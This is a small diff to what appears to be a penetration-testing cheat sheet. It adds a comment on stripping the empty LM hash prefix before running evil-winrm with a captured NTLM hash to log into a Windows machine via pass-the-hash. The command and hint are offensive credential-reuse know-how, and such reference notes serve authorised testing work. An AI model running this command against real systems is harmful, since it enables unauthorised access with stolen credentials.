@@ -59,6 +59,7 @@ Connect to Windows Machine using obtained hash (pass the hash):
 #winrm #evil-win-rm #evilwinrm #pth #pass-the-hash
 
 ```shell
+#remove aad3b435b51404eeaad3b435b51404ee: from hash
 evil-winrm -i $TARGET_IP -u $USER -H $TARGET_HASH
 ```
 ---
